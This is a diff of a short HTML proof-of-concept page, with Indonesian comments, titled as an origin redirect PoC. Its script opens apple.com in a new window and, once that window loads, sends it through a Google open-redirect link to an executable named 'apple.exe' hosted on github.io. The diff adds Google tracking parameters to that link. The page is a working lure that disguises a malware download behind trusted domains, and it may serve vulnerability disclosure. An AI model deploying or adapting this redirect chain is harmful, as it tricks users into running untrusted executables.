@@ -1,19 +1,20 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
     <meta charset="utf-8">
-    <title>Event-based Redirect PoC</title>
+    <title>Non-setTimeout Origin Redirect PoC</title>
 </head>
 <body>
 
 <script>
 function a() {
+    // Step 1: buka trusted domain
     let win = window.open("https://apple.com", "x");
 
-    // Redirect terjadi saat window selesai load
+    // Step 2: redirect saat page load (event-based, bukan timing)
     win.onload = function () {
         win.location.href =
-            "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe";
+            "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe";
     };
 }
 </script>
@@ -24,3 +25,4 @@ function a() {
 
 </body>
 </html>
+
